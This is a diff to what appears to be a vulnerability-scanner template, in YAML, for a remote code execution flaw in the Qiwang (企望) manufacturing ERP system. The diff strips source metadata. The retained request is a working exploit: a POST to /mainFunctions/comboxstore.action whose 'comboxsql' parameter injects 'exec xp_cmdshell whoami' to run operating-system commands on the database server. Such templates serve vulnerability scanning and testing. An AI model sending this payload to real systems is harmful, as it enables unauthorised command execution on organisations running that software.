@@ -3,12 +3,8 @@ info:
   name: 企望制造ERP系统RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/whp6l7vgedka1pgc'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: whp6l7vgedka1pgc
-    fofa: 暂无
 http:
 - raw:
   - 'POST /mainFunctions/comboxstore.action HTTP/1.1
@@ -33,8 +29,6 @@ http:
 
 
     Upgrade-Insecure-Requests: 1
-
-
 
 
     comboxsql=exec%20xp_cmdshell%20''whoami''
